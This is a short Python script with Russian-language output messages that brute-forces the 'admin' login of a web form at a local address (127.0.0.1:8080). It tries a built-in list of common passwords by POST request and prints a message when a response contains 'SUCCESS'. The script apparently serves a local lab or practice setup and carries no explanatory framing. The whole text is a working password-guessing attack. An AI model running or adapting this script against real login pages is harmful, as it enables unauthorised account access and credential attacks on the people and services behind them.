import urllib.request
import urllib.parse

url = 'http://127.0.0.1:8080/'
passwords = ['123', 'admin', 'password', 'secret', 'qwerty']

for p in passwords:
    data = urllib.parse.urlencode({'user': 'admin', 'pass': p}).encode()
    req = urllib.request.Request(url, data=data, method='POST')
    try:
        with urllib.request.urlopen(req) as response:
            html = response.read().decode()
            if "SUCCESS" in html:
                print(f"Пароль найден: {p}")
                break
            else:
                print(f"Не подошел: {p}")
    except Exception as e:
        print(f"Ошибка подключения: {e}")
